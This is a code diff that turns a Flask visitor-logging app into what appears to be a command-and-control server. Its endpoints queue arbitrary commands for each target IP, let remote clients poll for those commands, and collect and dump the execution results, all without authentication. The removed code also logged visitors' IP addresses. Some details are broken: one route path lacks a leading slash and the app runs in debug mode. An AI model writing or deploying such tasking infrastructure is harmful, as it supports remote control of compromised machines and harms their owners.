@@ -1,44 +1,57 @@
-from flask import Flask, request, make_response, Response
-from flask_socketio import SocketIO, emit
+from flask import Flask, request, make_response, Response, jsonify
 import redis
 import json
 import os
 
 app = Flask(__name__)
-socketio = SocketIO(app)
-REDIS_HOST = os.environ.get('REDIS_HOST', '127.0.0.1')
-REDIS_PORT = os.environ.get('REDIS_PORT', '6379')
-redis_client = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, db=0)
-redis_pubsub = redis_client.pubsub()
-redis_pubsub.subscribe('names')
+r = redis.Redis()
 
+@app.route('send' , methods=['POST'])
+def send():
+    ip_address = request.form.get('ip_address')
+    command = request.form.get('command')
 
-@app.route('/admin')
-def admin():
-    return app.send_static_file('admin.html')
+    r.rpush(f'commands:{ip_address}', command)
 
-@app.route('/stream')
-def stream():
-    return Response(event_stream(), mimetype="text/event-stream")
-
-def event_stream():
-
-    for message in redis_pubsub.listen():
-        yield f"data: {message['data']}"
-
-@app.route('/')
-@app.route('/<name>')
-def index(name='anonymous'):
+    return 'https://media.tenor.com/rcZMAz3r-fQAAAAM/borat-very.gif'
+@app.route('/receive', methods=['GET'])
+def receive():
     ip_address = request.remote_addr
-    user_data = {
-        'name': name,
-        'ip': ip_address
-    }
-    redis_client.publish('names', json.dumps(user_data))
+    # Retrieve commands for the IP address
+    commands = r.lrange(f'commands:{ip_address}', 0, -1)
 
-    response = make_response(f"Hello {name}!")
-    return response
+    r.delete(f'commands:{ip_address}')
+
+    return jsonify({'commands': commands})
+
+@app.route('/result', methods=['POST'])
+def result():
+    ip_address = request.remote_addr
+    results = json.loads(request.form.get('results'))
+
+    for result in results:
+        r.rpush(f'results:{ip_address}', json.dumps(result))
+
+    return 'Results received successfully'
+
+@app.route('/get_results', methods=['GET'])
+def get_results():
+    all_results = {}
+
+    ip_addresses = r.keys('results:*')
+
+    for ip_address in ip_addresses:
+        ip = ip_address.decode('utf-8').split(':')[1]
+
+        # Retrieve results for the IP address
+        results = r.lrange(ip_address, 0, -1)
+        results = [json.loads(result) for result in results]
+
+        r.delete(ip_address)
+        all_results[ip] = results
+
+    return jsonify(all_results)
 
 
 if __name__ == "__main__":
-    socketio.run(app, host = 'localhost', port = 6969, debug=True)
+    app.run(debug=True)
